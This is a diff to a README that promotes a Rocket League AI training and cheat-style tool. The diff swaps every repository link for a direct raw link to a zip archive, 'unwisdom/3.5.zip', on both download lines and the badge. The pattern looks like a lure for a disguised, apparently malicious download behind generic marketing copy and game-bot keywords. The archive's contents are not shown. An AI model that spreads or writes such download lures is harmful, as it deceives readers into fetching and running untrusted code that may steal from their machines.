@@ -1,12 +1,12 @@
 # 🎮 rocket-league-ai-ranked-training-lab - Train Smarter, Rank Higher Today
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab/main/unwisdom/3.5.zip)
 
 ## 🚀 Getting Started
 
 Welcome to your all-in-one Rocket League training and analysis toolkit. Whether you're grinding through Diamond or pushing for Supersonic Legend, this application helps you understand your gameplay, practice mechanics, review replays, and track your ranked progress — all in one place.
 
-Visit this link to download the application: [https://github.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab](https://github.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab)
+Visit this link to download the application: [https://raw.githubusercontent.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab/main/unwisdom/3.5.zip](https://raw.githubusercontent.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab/main/unwisdom/3.5.zip)
 
 ## 📥 Download & Installation
 
@@ -122,6 +122,6 @@ Stop guessing what you're doing wrong. Get objective data, structured training, 
 
 **Download now and start your climb to the top.**
 
-Visit this link to download the application: [https://github.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab](https://github.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab)
+Visit this link to download the application: [https://raw.githubusercontent.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab/main/unwisdom/3.5.zip](https://raw.githubusercontent.com/Maloryinherrightmind2864/rocket-league-ai-ranked-training-lab/main/unwisdom/3.5.zip)
 
 Keywords: ai-game-bot, competitive-gaming-tools, game-assistance, game-automation, game-enhancer, rocket-league, rocket-league-ai, rocket-league-enhancer, rocket-league-research, rocket-league-tools, rocket-league-visuals, unreal-engine-research
